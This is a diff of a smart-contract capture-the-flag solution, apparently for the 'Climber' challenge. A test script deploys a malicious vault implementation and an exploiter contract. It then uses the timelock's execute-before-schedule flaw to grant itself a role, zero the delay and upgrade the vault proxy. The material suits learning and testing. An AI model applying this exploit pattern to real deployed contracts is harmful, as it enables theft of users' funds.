@@ -58,6 +58,57 @@ describe('[Challenge] Climber', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // 1. deploy the malicious implementation
+        const maliciousImplementationFactory = await ethers.getContractFactory("ClimberVaultMaliciousImplementation", player)
+        const maliciousImplementation = await maliciousImplementationFactory.deploy()
+
+        // 2. deploy the attacker contract
+        const climberExploiterFactory = await ethers.getContractFactory("ClimberExploiter", player)
+        const climberExploiter = await climberExploiterFactory.deploy(
+            token.address,
+            timelock.address,
+            vault.address
+        )
+
+        // 3. build the ClimberTimelock::execute() calldatas
+        const PROPOSER_ROLE = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("PROPOSER_ROLE"))
+
+        // 3.1 Timelock:grantRole(PROPOSER_ROLE, climberExploiter) -> so he can call schedule() later
+        const grantRoleOperation = new ethers.utils.Interface(
+            ["function grantRole(bytes32 role, address account)"]
+        ).encodeFunctionData("grantRole", [PROPOSER_ROLE, climberExploiter.address])
+
+        // 3.2 Timelock:updateDelay(0)
+        const updateDelayOperation = new ethers.utils.Interface(
+            ["function updateDelay(uint64 newDelay)"]
+        ).encodeFunctionData("updateDelay", [0])
+
+        // 3.3 upgrade the ClimberVault logic to our malicious one
+        const updateImplementationOperation = new ethers.utils.Interface(
+            ["function upgradeTo(address newImplementation)"]
+        ).encodeFunctionData("upgradeTo", [maliciousImplementation.address])
+
+        // 4.4 call ClimberExploiyer:exploit()
+        const scheduleOperation = new ethers.utils.Interface(
+            ["function exploit()"]
+        ).encodeFunctionData("exploit", undefined)
+
+        // 4.5 pre-calculate the calldata arrays to avoid the problem I was facing initially
+        const targets = [timelock.address, timelock.address, vault.address, climberExploiter.address]
+        const operations = [grantRoleOperation, updateDelayOperation, updateImplementationOperation, scheduleOperation]
+
+        // 5. setABI on the exploiter contract
+        await climberExploiter.connect(player).setABI(targets, operations);
+
+        // 6. call Timelock:execute
+        await timelock.connect(player).execute(
+            targets,
+            [0, 0, 0, 0],
+            operations,
+            ethers.utils.hexZeroPad("0x00", 32) // salt = address(0)
+        )
+
     });
 
     after(async function () {
